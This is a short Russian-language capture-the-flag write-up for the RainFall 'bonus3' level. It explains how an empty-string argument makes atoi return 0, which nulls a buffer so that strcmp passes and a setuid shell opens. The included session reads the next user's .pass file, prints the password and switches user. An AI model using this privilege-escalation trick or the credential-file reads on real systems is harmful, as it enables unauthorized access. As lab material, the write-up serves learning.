Мы можем найти исполняемый файл, который выводит новую строку, когда мы передаем ему один аргумент :

После анализа его с помощью gdb мы можем найти только main().

Программе требуется как минимум 1 аргумент (argv[1]), в противном случае она завершает работу, программа также считывает файл .pass для следующего уровня и сохраняет его в буфер с помощью fread().
Затем программа вызывает atoi() с argv[1] в качестве параметра и использует результат в качестве индекса для нашего буфера, в этот индекс программа вставляет нулевой байт.
После этого программа выполняет сравнение нашего буфера, он должен быть равен argv[1], чтобы мы выполнили оболочку.
Дело в том, что мы не знаем флага! Но если мы введем пустую строку в качестве первого аргумента, atoi() вернет 0, так как строка не содержит представления числового значения.
Поэтому он заменит первый символ в буфере на \0 (buffer[atoi ("")] = 0), и поскольку strcmp останавливается на \0, обе строки будут считаться идентичными :

bonus3@RainFall:~$ ./bonus3 ""
$ whoami
end
$ cat /home/user/end/.pass
3321b6f81659f9a71c76616f606e4b50189cecfea611393d5d649f75e157353c
$ exit
bonus3@RainFall:~$ su end
Password:
end@RainFall:~$ ls -l
total 4
-rwsr-s---+ 1 end users 26 Sep 23  2015 end
end@RainFall:~$ cat end
Congratulations graduate!
